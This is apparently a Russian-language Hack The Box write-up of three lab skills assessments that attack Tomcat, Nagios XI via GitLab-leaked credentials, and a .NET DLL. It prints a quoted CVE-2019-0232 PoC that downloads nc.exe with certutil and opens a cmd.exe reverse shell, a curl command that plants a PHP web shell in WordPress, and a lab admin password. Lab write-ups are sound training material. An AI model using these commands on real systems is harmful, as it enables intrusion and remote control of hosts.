# Attacking common applications
## Skills Assessment I

Сканирование `nmap` показало несколько открытых HTTP-портов (80, 8000, 8080)

```bash
sudo nmap -sV -sC --min-rate=1000 10.129.20.47 -oA discovery/fast-sweep
```

![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png]]

По баннеру `IIS httpd 10.0` на TCP 80 и открытым портам 135,139,445 можно предположить, что это Windows хост

Наиболее интересными выглядят `Apache Tomcat/9.0.0.M1` на 8080 и открытый AJP на 8009
```
<SNIP>
8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.0.M1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
<SNIP>
```

![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321212618.png]]

Панели на `/manager` и `/host-manager` были закрыты
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321213023.png]]

Поиск через  `searсhsploit` показал несколько уязвимостей для данной версии приложения
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321221612.png]]

Интерес представляет `CVE-2020-1938`
Уязвимость позволяет неавторизованному пользователю загрузить JSP файл с помощью PUT запроса

Однако сервер не поддерживает PUT
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321222558.png]]

Также версия уязвима к `CVE-2020-1938` (GhostCat)
Уязвимость возможна из-за чрезмерного доверия tomcat к AJP соединению. Она позволяет читать файлы из webroot неавторизованному пользователю через AJP

С помощью модуля `admin/http/tomcat_ghostcat` в msf мне удалось прочитать `/WEB-INF/web.xml`, тем самым подтвердив уязвимость
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321220741.png]]

Однако, я не обнаружил прямой эскалации в RCE и начал искать дополнительные эндпойнты

Во время фуззинга была обнаружена нестандартную  директорию `/WEB-INF/cgi`
Я решил проверить приложение на наличие CGI-скриптов в `/cgi/` и нашел эндпойнт `/cgi/cmd.bat`
```bash
ffuf -u "http://10.129.20.70:8080/cgi/FUZZ" \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
     -e .bat,.cmd
```

![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321231028.png]]

Хост потенциально уязвим к `CVE-2019-0232`
Уязвимость связана с некорректной обработкой аргументов в CGI Servlet на Windows,  что позволяет внедрять команды через параметры запроса

Пробуем выполнить команду и подтверждаем уязвимость
```bash
curl -i 'http://10.129.20.70:8080/cgi/cmd.bat?&dir'
```

![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321231619.png]]

Для получения reverse shell использовал PoC из [этого](https://github.com/jaiguptanick/CVE-2019-0232) репозитория
```python
url1 = host + ":" + str(port) + "/cgi/cmd.bat?" + "&&C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+http%3A%2F%2F" + server_ip + ":" + server_port + "%2Fnc%2Eexe+nc.exe"
url2 = host + ":" + str(port) + "/cgi/cmd.bat?&nc.exe+" + server_ip + "+" + nc_port + "+-e+cmd.exe"
```

Эксплуатация проходит в два этапа
1. Загружает `nc.exe` на таргет через `certutil`
2. Использует `nc.exe` для установки reverse shell соединения

![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321235957.png]]

После получения shell'а был получен доступ к системе с правами `NT Authority\System`, что позволило прочитать флаг администратора
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322000100.png]]

---
## Skills Assessment II

На старте получаем IP и vhost
```
gitlab.inlanefreight.local
10.129.201.90
```

Запишем их в `/etc/hosts`
```bash
IP=10.129.201.90
printf "%s\t%s\n\n" "$IP" "gitlab.inlanefreight.local" | sudo tee -a /etc/hosts
```

Сканирование `nmap` показало несколько открытых HTTP-портов (80,443,8180), на одном из которых работает GitLab
```bash
sudo nmap -sV -sC --min-rate=1000 --open gitlab.inlanefreight.local -oA discovery/fast-sweep
```
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322000924.png]]

Открываем GitLab и обнаруживаем включенную регистрацию
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322003424.png]]

После создания аккаунта мы видим несколько репозиториев. 
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322003600.png]]

В `Administrator / Virtualhost` в `README.md` можно заметить еще один vhost `monitoring.inlanefreight.local`

![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322003641.png]]

Добавляем запись в  `/etc/hosts` и открываем адрес в браузере
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322003850.png]]

На хосте развернут `Nagios XI` - инструмент для мониторинга сети и инфраструктуры
Я попробовал стандартные пары логин-пароль, но не получил доступа к админ панели
```
nagios:nagios
nagiosadm:root 
admin:admin
```

После этого я решил вернуться в GitLab и просмотреть другие репозитории
В `Administrator / Nagios Postgresql` я увидел строку подключения с пользователем `nagiosadmin`
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322010625.png]]

Учитывая, что Nagios использует PostgreSQL, я попробовал использовать эти учетные данные. Они подошли и я попал в панель администратора
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322011001.png]]

Из админ панели я узнал, что установлен `Nagios XI 5.7.5`, который узявим к `CVE-2021-3277`
Уязвимость позволяет администраторам загружать произвольные файлы из-за некорректной проверки функции переименования в компоненте `custom-includes`

Для эксплуатации был использован модуль `linux/http/nagios_xi_configwizards_authenticated_rce` в msf для получения RCE

![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322021157.png]]

В директории `/var/www/` я нашел еще два хоста 
- `blog.inlanefreight.local` - Wordpress приложение
- `app.inlanefreight.local` -  `index.html` страница

Наличие wordpress c правами на запись предоставляет удобную точку для размещения web-shell'а

![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322021236.png]]

```bash
curl http://10.10.14.170:8000/phpbash.php -o /var/www/blog.inlanefreight.local/wp-content/themes/shell.php
```

По условиям задачи после получения RCE нужно прочитать `flag.txt`. Ищем `find` и закрываем машину

```bash
find / -name "*flag.txt" 2>/dev/null
```

![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322023550.png]]

---
## Skills Assessment III

По условиям задачи нам нужно найти hardcode creds в `MultimasterAPI.dll`
Для этого нам предоставляют Windows хост с уязвимой DLL и учетную запись администратора

```bash
xfreerdp /v:10.129.95.200 \
         /u:Administrator \
         /p:xcyj8izxNVzhf4z \
         /dynamic-resolution
```

Библиотека находится по пути `C:\inetpub\wwwroot\bin`
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322121658.png]]

Для анализа откроем ее в `dnSpy` - инструменте для декомпиляции `.NET` приложений
И после быстрого просмотра видим  строку подключения в `MultimasterAPI.Contorllers`
![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322121937.png]]
